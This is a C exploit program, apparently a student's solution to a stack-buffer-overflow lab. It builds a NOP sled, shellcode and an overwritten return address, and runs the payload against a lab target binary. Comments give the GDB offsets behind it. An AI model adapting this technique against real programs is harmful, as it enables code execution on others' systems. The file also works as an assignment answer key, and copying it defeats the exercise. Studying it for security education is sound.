#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	args[0] = TARGET;
		
	/* 

	REFERENCE: https://www.soldierx.com/tutorials/Stack-Smashing-Modern-Linux-System

	INFO FROM GDB:

		% info frame
			Arglist at 0x2021fee0, args: argc=2, argv=0x7fffffffdf98
 			Locals at 0x2021fee0, Previous frame's sp is 0x2021fef0
 			Saved registers:
  			rbp at 0x2021fee0, rip at 0x2021fee8

		% p &buf
			0x2021fe70

		Difference between next instruction pointer and starting address of
		buffer on the stack is 120 bytes. Hence, we need to cause overflow of 
		120 bytes + overwrite the return address i.e. make rip store the start
		address of the buffer. So 120th to 124th places in our exploit string
		will be buffer start address.

		SHELL CODE: 45 bytes + 3 bytes word_ alignment

		Buffer size: 96 bytes

		//  Acc. to lecture, we can't accurately judge the  buf start address so we add NOP instructions.

		Remaining buf_size after adding shellcode = 48 bytes. Hence, we need to fill buffer by 48 bytes NOP instructions
		After shellcode, we again fill the space till 120 by NOP instructions.

		So args[1] looks like NOP instructions + shellcode + NOP instructions + buf start address from gdb with total 124 bytes

	*/

	char exploit[124];
	memset(exploit, '\x00', 124);


	int i;

	// filling up first 48 bytes of exploit string with NOP instructions
	for (i = 0; i < 48; i++){
		exploit[i] = '\x90';
	}

	strcat(exploit, shellcode); // append the shellcode to exploit string
	strcat(exploit, "\x90\x90\x90"); // pad the shellcode to make it word-aligned

	// fill up remaining bytes till 120 with NOP instructions
	for(i = 96; i < 120; i++){
		exploit[i] = '\x90';
	}

	// overwrite return address with buf start address
	exploit[120] = '\x70';
	exploit[121] = '\xfe';
	exploit[122] = '\x21';
	exploit[123] = '\x20';


	args[1] = exploit;

	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}